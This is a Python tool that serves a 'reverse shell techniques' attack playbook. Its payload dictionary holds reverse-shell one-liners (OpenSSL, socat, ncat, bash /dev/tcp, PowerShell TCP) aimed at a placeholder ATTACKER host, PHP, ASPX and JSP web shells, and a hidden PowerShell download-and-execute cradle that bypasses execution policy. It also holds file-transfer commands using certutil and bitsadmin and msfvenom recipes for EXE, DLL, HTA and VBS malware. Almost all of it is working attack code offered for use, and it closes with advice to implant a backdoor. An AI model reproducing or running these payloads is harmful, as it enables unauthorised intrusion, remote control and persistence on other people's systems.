#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/reverse-shell-techniques

Skill: SKILL: Reverse Shell Techniques — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-reverse-shell-techniques.py --help
      python hack-skills-reverse-shell-techniques.py --list
      python hack-skills-reverse-shell-techniques.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/reverse-shell-techniques'
TITLE = 'SKILL: Reverse Shell Techniques — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: reverse-shell-techniques", "description: >-", "Reverse shell techniques playbook. Use when establishing remote shells including language one-liners, encrypted shells (OpenSSL/socat/ncat), web shells, PTY upgrades, file transfer methods, PowerShell shells, and Windows payload generation."],
    'skill-reverse-shell-techniques-expert-attack-playbook': [],
    '0-related-routing': ["Before going deep, consider loading:", "- [tunneling-and-pivoting](../tunneling-and-pivoting/SKILL.md) after shell access for network pivoting", "- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) or [windows-privilege-escalation](../windows-privilege-escalation/SKILL.md) after landing shell", "- [windows-av-evasion](../windows-av-evasion/SKILL.md) when AV blocks shell payloads"],
    'quick-reference': ["Also load [SHELL_CHEATSHEET.md](./SHELL_CHEATSHEET.md) when you need:", "- Complete one-liner reverse shells for 20+ languages", "- Copy-paste ready payloads with placeholder substitution"],
    '1-reverse-vs-bind-shell-decision': [],
    '2-encrypted-shells': [],
    'openssl-reverse-shell': ["```bash"],
    'attacker-generate-cert-listen': ["openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=localhost'", "openssl s_server -quiet -key key.pem -cert cert.pem -port 4444"],
    'victim': ["mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER:4444 > /tmp/s; rm /tmp/s"],
    'socat-encrypted-shell': ["```bash"],
    'attacker-generate-cert-listen': ["openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 30 -out shell.crt", "cat shell.key shell.crt > shell.pem", "socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,fork STDOUT"],
    'victim': ["socat OPENSSL:ATTACKER:4444,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"],
    'ncat-ssl': ["```bash"],
    'attacker': ["ncat --ssl -lvnp 4444"],
    'victim': ["ncat --ssl ATTACKER 4444 -e /bin/bash"],
    '3-web-shells': [],
    'php': ["```php", "<?php system($_GET['cmd']); ?>", "<?php echo shell_exec($_GET['cmd']); ?>", "<?php passthru($_REQUEST['cmd']); ?>", "<!-- Minimal stealth shell -->", "<?=`$_GET[0]`?>", "<!-- POST-based with password -->", "<?php if($_POST['k']==='SECRET'){system($_POST['cmd']);} ?>"],
    'aspx': ["```aspx", "<%@ Page Language=\"C#\" %>", "<%@ Import Namespace=\"System.Diagnostics\" %>", "<% Process.Start(new ProcessStartInfo(\"cmd.exe\",\"/c \"+Request[\"cmd\"]){UseShellExecute=false,RedirectStandardOutput=true}).StandardOutput.ReadToEnd(); %>"],
    'jsp': ["```jsp", "<%@ page import=\"java.io.*\" %>", "<% Process p=Runtime.getRuntime().exec(request.getParameter(\"cmd\"));", "BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));", "String l;while((l=br.readLine())!=null){out.println(l);} %>"],
    'upload-trigger-patterns': ["1. Find upload endpoint \u2192 upload shell with allowed extension bypass", "2. Locate uploaded file (predictable path, directory listing, response leak)", "3. Trigger: GET /uploads/shell.php?cmd=id", "4. Upgrade to reverse shell: ?cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'"],
    '4-pty-upgrade-sequence': [],
    'standard-python-upgrade': ["```bash"],
    'step-1-spawn-pty': ["python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"],
    'step-2-background-shell': [],
    'press-ctrl-z': [],
    'step-3-configure-terminal-on-attacker': ["stty raw -echo; fg"],
    'step-4-set-environment-back-in-shell': ["export TERM=xterm-256color", "stty rows 40 cols 160"],
    'alternative-upgrades': ["```bash"],
    'script-command': ["script /dev/null -c bash"],
    'socat-full-pty-requires-socat-on-victim': [],
    'attacker': ["socat file:`tty`,raw,echo=0 tcp-listen:4444"],
    'victim': ["socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444"],
    'rlwrap-for-readline-support-attacker-side': ["rlwrap nc -lvnp 4444"],
    'expect': ["/usr/bin/expect -c 'spawn bash; interact'"],
    '5-file-transfer-methods': [],
    'linux': ["```bash"],
    'wget-curl': ["wget http://ATTACKER:8000/file -O /tmp/file", "curl http://ATTACKER:8000/file -o /tmp/file"],
    'python-http-server-attacker-side': ["python3 -m http.server 8000"],
    'nc-file-transfer': [],
    'receiver': ["nc -lvnp 9999 > file"],
    'sender': ["nc RECEIVER 9999 < file"],
    'base64-encode-decode-no-tools-needed': [],
    'encode-on-source': ["base64 -w0 file"],
    'paste-on-target': ["echo \"BASE64_STRING\" | base64 -d > file"],
    'scp-through-pivot': ["scp -o ProxyJump=pivot user@target:/path/file ./local"],
    'windows': ["```powershell"],
    'powershell-downloadfile': ["(New-Object Net.WebClient).DownloadFile('http://ATTACKER/file','C:\\temp\\file')"],
    'powershell-invoke-webrequest-ps-3-0': ["Invoke-WebRequest -Uri http://ATTACKER/file -OutFile C:\\temp\\file", "iwr http://ATTACKER/file -o C:\\temp\\file"],
    'certutil': ["certutil -urlcache -f http://ATTACKER/file C:\\temp\\file"],
    'bitsadmin': ["bitsadmin /transfer job /download /priority high http://ATTACKER/file C:\\temp\\file"],
    'smb-share-attacker-hosts': [],
    'attacker-impacket-smbserver-share-tmp-share-smb2support': ["copy \\\\ATTACKER\\share\\file C:\\temp\\file"],
    '6-powershell-reverse-shells': ["```powershell"],
    'one-liner-tcp-reverse-shell': ["$c=New-Object Net.Sockets.TCPClient('ATTACKER',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"],
    'download-cradle-execute': ["powershell -nop -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')\""],
    'base64-encoded-execution': ["$cmd = '...reverse shell code...'", "$bytes = [Text.Encoding]::Unicode.GetBytes($cmd)", "$encoded = [Convert]::ToBase64String($bytes)", "powershell -ep bypass -enc $encoded"],
    '7-msfvenom-payloads': ["```bash"],
    'linux-reverse-shell-elf': ["msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f elf -o shell"],
    'windows-reverse-shell-exe': ["msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o shell.exe"],
    'meterpreter-staged': ["msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o meter.exe"],
    'web-payloads': ["msfvenom -p php/reverse_php LHOST=ATTACKER LPORT=4444 -f raw > shell.php", "msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f raw > shell.jsp", "msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f aspx -o shell.aspx"],
    'dll-hta-vbs': ["msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll -o evil.dll", "msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f hta-psh -o evil.hta", "msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f vbs -o evil.vbs"],
    '8-decision-tree': ["Need remote shell on target", "\u251c\u2500\u2500 Can execute commands already (RCE)?", "\u2502   \u251c\u2500\u2500 Linux target?", "\u2502   \u2502   \u251c\u2500\u2500 bash/python/perl available? \u2192 one-liner reverse shell (CHEATSHEET.md)", "\u2502   \u2502   \u251c\u2500\u2500 Need encryption? \u2192 OpenSSL or socat SSL shell (\u00a72)", "\u2502   \u2502   \u2514\u2500\u2500 Outbound blocked? \u2192 bind shell or tunnel (see tunneling-and-pivoting)", "\u2502   \u2502", "\u2502   \u251c\u2500\u2500 Windows target?", "\u2502   \u2502   \u251c\u2500\u2500 PowerShell available? \u2192 PS reverse shell (\u00a76)", "\u2502   \u2502   \u251c\u2500\u2500 Need binary? \u2192 msfvenom payload (\u00a77)", "\u2502   \u2502   \u2514\u2500\u2500 AV blocking? \u2192 load windows-av-evasion skill", "\u2502   \u2502", "\u2502   \u2514\u2500\u2500 Web server (upload possible)?", "\u2502       \u251c\u2500\u2500 PHP? \u2192 PHP web shell (\u00a73) \u2192 upgrade to reverse shell", "\u2502       \u251c\u2500\u2500 ASP.NET? \u2192 ASPX shell (\u00a73)", "\u2502       \u2514\u2500\u2500 Java/Tomcat? \u2192 JSP shell (\u00a73)", "\u251c\u2500\u2500 Got a dumb shell?", "\u2502   \u251c\u2500\u2500 Python available? \u2192 PTY upgrade (\u00a74)", "\u2502   \u251c\u2500\u2500 script available? \u2192 script /dev/null -c bash (\u00a74)", "\u2502   \u251c\u2500\u2500 socat on target? \u2192 socat full PTY (\u00a74)", "\u2502   \u2514\u2500\u2500 None? \u2192 rlwrap on attacker side for readline", "\u251c\u2500\u2500 Need to transfer tools?", "\u2502   \u251c\u2500\u2500 Linux: wget/curl/nc/base64 (\u00a75)", "\u2502   \u251c\u2500\u2500 Windows: certutil/PowerShell/bitsadmin/SMB (\u00a75)", "\u2502   \u2514\u2500\u2500 No outbound? \u2192 base64 copy-paste (\u00a75)", "\u2514\u2500\u2500 Shell established \u2014 next steps?", "\u251c\u2500\u2500 Privilege escalation \u2192 load linux/windows-privilege-escalation", "\u251c\u2500\u2500 Pivot to internal network \u2192 load tunneling-and-pivoting", "\u2514\u2500\u2500 Persistence \u2192 implant backdoor"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()